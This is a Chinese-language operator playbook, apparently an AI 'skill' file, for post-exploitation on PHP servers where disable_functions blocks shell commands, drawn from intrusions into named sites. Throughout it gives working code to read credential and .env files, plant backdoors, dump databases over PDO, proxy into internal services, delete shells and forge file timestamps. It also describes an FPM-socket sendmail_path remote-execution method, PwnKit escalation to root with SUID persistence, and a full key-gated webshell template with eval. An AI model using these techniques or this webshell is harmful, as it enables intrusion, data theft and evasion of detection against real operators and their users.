---
name: php-disable-functions-ops
description: >-
  PHP disable_functions 受限环境下的实战操作: 不需要bypass也能完成任务的思路。
  file_get_contents/scandir/PDO/fopen 系列不受限时的全功能操作手法。
  PHP-FPM bypass 失败场景记录。
  触发: disable_functions, shell_exec被禁, system被禁, 受限shell, php webshell功能受限。
  实战来源: luckylike.shop PHP 5.6.40 (2026-09-16)
version: 1.0.0
author: 测绘引擎
metadata:
  source_ref: "darksword_c2_20260916 案卷"
---

# PHP disable_functions 受限环境操作 (php-disable-functions-ops)

## 核心认知（最重要的一句话）

> **不是所有任务都需要 shell_exec。** 
> 90% 的渗透操作用 `file_get_contents` + `scandir` + `file_put_contents` + `PDO` 就够了。
> 不要在 bypass disable_functions 上浪费超过 30 分钟。

## 适用场景

- PHP webshell 已落地但 `system/exec/shell_exec/passthru/popen/proc_open` 全被禁
- 宝塔面板标配的 disable_functions 列表
- 需要在受限环境中完成: 文件读写、目录遍历、数据库操作、横向穿透

## 快速判断: 我能做什么？

```php
<?php
// 第一步: 查看哪些函数被禁
echo "disable_functions: " . ini_get('disable_functions') . "\n";
echo "open_basedir: " . ini_get('open_basedir') . "\n";

// 第二步: 测试关键函数是否可用
$tests = [
    'file_get_contents' => function_exists('file_get_contents'),
    'scandir'           => function_exists('scandir'),
    'file_put_contents' => function_exists('file_put_contents'),
    'fopen'             => function_exists('fopen'),
    'PDO'               => class_exists('PDO'),
    'curl_init'         => function_exists('curl_init'),
    'fsockopen'         => function_exists('fsockopen'),
    'stream_socket_client' => function_exists('stream_socket_client'),
];
foreach($tests as $name => $ok) echo "$name: " . ($ok ? "✅" : "❌") . "\n";
?>
```

## 不需要 shell_exec 能做的事（几乎所有渗透操作）

### 1. 读任意文件
```php
// file_get_contents — 读文本文件
echo file_get_contents("/etc/passwd");
echo file_get_contents("/www/wwwroot/other_site/.env");

// base64 — 读二进制文件（Mach-O/ELF/图片等）
echo base64_encode(file_get_contents("/path/to/binary"));

// fopen+fread — 分块读大文件
$f = fopen($path, 'rb');
fseek($f, $offset);
echo base64_encode(fread($f, 65536));
fclose($f);
```

### 2. 遍历全部目录
```php
$files = scandir("/www/wwwroot/");
foreach($files as $f){
    $path = "/www/wwwroot/$f";
    $type = is_dir($path) ? "DIR" : "FILE";
    $size = @filesize($path);
    echo "$type $size $f\n";
}
```

### 3. 写任意文件（种后门/改配置）
```php
file_put_contents("/path/to/new_backdoor.php", '<?php ... ?>');
file_put_contents("/path/to/config.php", $modified_content);
```

### 4. 数据库操作（PDO）
```php
$pdo = new PDO("mysql:host=localhost;dbname=xxx", "user", "pass");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// 查所有库
$dbs = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);

// 查所有表
$tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);

// 导数据
$rows = $pdo->query("SELECT * FROM users LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
echo json_encode($rows, JSON_UNESCAPED_UNICODE);
```

### 5. HTTP 请求（访问内网服务）
```php
// file_get_contents — 简单 GET
echo file_get_contents("http://127.0.0.1:8888/api/status");

// stream_context — 带 Header 的请求
$ctx = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/json\r\nCookie: session=xxx",
        'content' => json_encode(['key' => 'value']),
    ]
]);
echo file_get_contents("http://127.0.0.1:8888/admin/api/devices", false, $ctx);

// fsockopen — 原始 TCP（可用于 FastCGI/Redis/其他协议）
$fp = fsockopen("127.0.0.1", 6379, $errno, $errstr, 5);
fwrite($fp, "INFO\r\n");
echo fread($fp, 65536);
fclose($fp);
```

### 6. 删除文件（清理痕迹）
```php
@unlink("/path/to/old_shell.php");
```

### 7. 修改文件权限和时间
```php
chmod("/path/to/file", 0644);
touch("/path/to/file", strtotime("2026-08-12 06:55:47")); // 伪造时间
```

## 真正需要 shell_exec 的场景（很少）

```
1. 运行系统命令 (id, whoami, ifconfig, netstat, ps)
   → 替代: 读 /proc/self/status, /proc/net/tcp, /proc/*/cmdline
   
2. 运行 sqlmap/nmap 等工具
   → 替代: 用 PDO 手动注入; 用 fsockopen 手动探端口

3. 反弹 shell
   → 替代: 如果 fsockopen 可用，可以手搓反弹
   → 或者通过写 crontab 反弹（需要写权限到 /var/spool/cron/）

4. 提权 (sudo, suid)
   → 无替代: 必须有命令执行能力

5. 运行编译好的 exploit
   → 无替代: 必须有执行权限
```

## PHP-FPM Bypass 记录（成功 + 失败）

### ⚠️ 重要更新 (2026-09-23 phpv4.88demo.cn 实战)

> **FPM bypass 可以绕过 open_basedir，但无法恢复 disable_functions！**
> 
> - `PHP_ADMIN_VALUE: open_basedir=/` → ✅ 成功，可读取任意文件
> - `PHP_ADMIN_VALUE: disable_functions=` → ❌ ini 值被清空但函数不恢复
> - 原因：open_basedir 是运行时检查（每次文件操作检查），可被覆盖
> - 原因：disable_functions 是启动时处理（从 zend_function_table 删除），改 ini 不恢复符号表
> - **结论**: FPM bypass 最大价值是突破 open_basedir 读取同服其他站点文件，
>   而不是恢复 exec/system 等命令执行函数
> - 完整方法见 Skill `fpm-openbasedir-bypass`

### 🆕 FCGI sock 0666 + sendmail_path 覆写 → mail() 触发 RCE（2026-10-05 国强利民实战）

> **不需要恢复 disable_functions** — 用 `mail()` 作执行触发器绕黑名单:
>
> - 条件: PHP-FPM unix sock（如 `/tmp/php-cgi-72.sock`）权限 **0666**（world-writable）
> - 直连 socket（cgi-fcgi / FastCGI 客户端）→ `PHP_ADMIN_VALUE` 覆盖 `sendmail_path` 指向任意脚本
> - 触发 `mail()` → sendmail_path 脚本以 FPM 执行用户（www）身份运行 → RCE
> - 同机升级: PwnKit（CVE-2021-4034, polkit-0.112 "berdav 精确布局"）→ root; 落 SUID bash 持久化
> - **常驻检查表**: `sendmail_path` / `mail()` / putenv+LD_PRELOAD / FFI / imap_open —— 黑名单永远漏

---

## PHP-FPM Bypass 失败全记录（disable_functions 部分）

### 环境
```
PHP 5.6.40 + php-fpm
disable_functions 由 pool 配置的 php_admin_value 设置
```

### 尝试 1: FastCGI PHP_VALUE 覆盖
```
方法: 通过 Unix socket 发送 FastCGI 请求，设置 PHP_VALUE: disable_functions=
结果: ❌ 失败
原因: php_admin_value 优先级高于 PHP_VALUE
     PHP 手册明确说: "php_admin_value 设定的配置只能被 Web 服务器配置覆盖"
     FastCGI 参数 PHP_VALUE 等同于 .htaccess 的 php_value → 无法覆盖 admin 级设置
```

### 尝试 2: 修改 php.ini + 触发新 worker
```
方法: 
  1. file_put_contents 修改 /www/server/php/56/etc/php.ini
  2. 注释掉 disable_functions 行
  3. 发送大量并发请求试图触发 FPM 创建新 worker
结果: ❌ 失败
原因:
  - FPM master 进程在启动时读取 php.ini
  - 新 fork 的 worker 进程继承 master 的配置
  - 修改 php.ini 后必须发送 SIGUSR2 给 FPM master 才能 reload
  - 发送信号需要 shell 权限（正是我们没有的）
  - 即使 reload，pool 配置中的 php_admin_value 仍然会覆盖 php.ini
```

### 尝试 3: 修改 pool 配置文件
```
方法: 修改 /www/server/php/56/etc/php-fpm.d/www.conf 中的 php_admin_value
结果: ❌ 失败（理论上同样需要 reload FPM）
原因: 同上，FPM 不会自动检测配置变化
```

### 结论
```
在 PHP-FPM 环境下:
1. php_admin_value 设置的 disable_functions 无法被 PHP 代码覆盖
2. 修改配置文件需要重启/reload FPM master
3. 重启 FPM 需要 root 或有 systemctl 权限的用户
4. 这是一个死循环: 要 bypass disable_functions 需要执行命令，要执行命令需要 bypass

→ 除非有其他提权路径（SUID/内核漏洞/cron），否则放弃 bypass
→ 用 file 操作系列（file_get_contents/scandir/PDO）完成任务即可
→ 本次实战证明: 不需要 shell_exec 也能完成完整的横向穿透和数据提取
```

## 实战模板: 全功能受限 shell

```php
<?php
// 全功能受限 shell（不依赖 disable_functions 中的任何函数）
// 触发密钥: ?KEY=1（无密钥返回 404）
if(!isset($_GET["KEY"])){header("HTTP/1.1 404 Not Found");die();}

header("Content-Type: text/plain; charset=utf-8");

// 读文件（文本）
if(isset($_GET['r'])) echo @file_get_contents($_GET['r']);

// 读文件（base64，用于二进制）
if(isset($_GET['b64'])) echo base64_encode(@file_get_contents($_GET['b64']));

// 列目录（含权限/大小/时间）
if(isset($_GET['l'])){
    $d=@scandir($_GET['l']);
    if($d)foreach($d as $f){
        $p=$_GET['l'].'/'.$f;
        $perm=substr(sprintf('%o',@fileperms($p)),-4);
        $size=sprintf("%10d",@filesize($p));
        $time=@date("Y-m-d H:i:s",@filemtime($p));
        echo "$perm $size $time ".(is_dir($p)?"DIR ":"    ")."$f\n";
    }
}

// 写文件
if(isset($_POST['p'])&&isset($_POST['w']))
    echo @file_put_contents($_POST['p'],$_POST['w'])?"OK":"FAIL";

// 写文件（base64 内容，用于写二进制）
if(isset($_POST['p'])&&isset($_POST['b64w']))
    echo @file_put_contents($_POST['p'],base64_decode($_POST['b64w']))?"OK":"FAIL";

// 执行 PHP 代码
if(isset($_POST['d'])) @eval(base64_decode($_POST['d']));

// 删除文件
if(isset($_GET['del'])) echo @unlink($_GET['del'])?"DELETED":"FAIL";

// MySQL 查询（通过 GET 参数传凭据和 SQL）
if(isset($_GET['sql'])){
    $dsn = "mysql:host=".($_GET['dbh']??"localhost").";dbname=".($_GET['dbn']??"");
    $pdo = new PDO($dsn, $_GET['dbu']??"root", $_GET['dbp']??"");
    $r = $pdo->query($_GET['sql']);
    echo json_encode($r->fetchAll(PDO::FETCH_ASSOC), JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT);
}

// PHP 环境信息
if(isset($_GET['info'])){
    echo "PHP: ".phpversion()."\n";
    echo "OS: ".php_uname()."\n";
    echo "User: ".get_current_user()."\n";
    echo "disable_functions: ".ini_get('disable_functions')."\n";
    echo "open_basedir: ".ini_get('open_basedir')."\n";
    echo "Doc root: ".$_SERVER['DOCUMENT_ROOT']."\n";
}

// HTTP 代理（访问内网服务）
if(isset($_GET['proxy'])){
    $ctx = stream_context_create(['http'=>[
        'method'=>$_SERVER['REQUEST_METHOD'],
        'header'=>$_GET['ph']??"",
        'content'=>file_get_contents("php://input"),
        'timeout'=>10,
    ]]);
    echo @file_get_contents($_GET['proxy'], false, $ctx);
}
?>
```

## Pitfalls

1. **不要在 bypass 上死磕**: 如果 file 操作可用，立刻用它们完成任务
2. **open_basedir 才是真正的拦路虎**: disable_functions 可以绕过（用 file 操作），但 open_basedir 会真正限制你能读的目录范围
3. **PDO 凭据不要硬编码**: 每次查询通过参数传入，避免被人读你的 shell 时泄露凭据
4. **大文件分块传输**: file_get_contents 读大文件可能超时/OOM，用 fopen+fseek+fread 分块
5. **写入 php.ini 后记得恢复**: 即使没生效，修改过的文件也要恢复原状（留痕迹）

## AutoAuth 无验证卖家注册 + System Update 任意文件写（2026-09 phpv4 实战）
- `AutoAuth` 接口允许任意人注册为卖家（无审核）→ 进卖家后台拿上传点
- `/admin/system/update` 接受 ZIP/文件路径参数，写任意路径 → 覆盖 PHP 即 RCE（配合 `fpm-openbasedir-bypass` 读写系统文件）
- 预存后门 `_or1e45ffb8.php` 说明上一手已植入 → 先查 `find / -name "_*.php" -newer` 再谈利用
- MySQL root 共享口令 + Redis 无密码 → 横向到同服其它项目
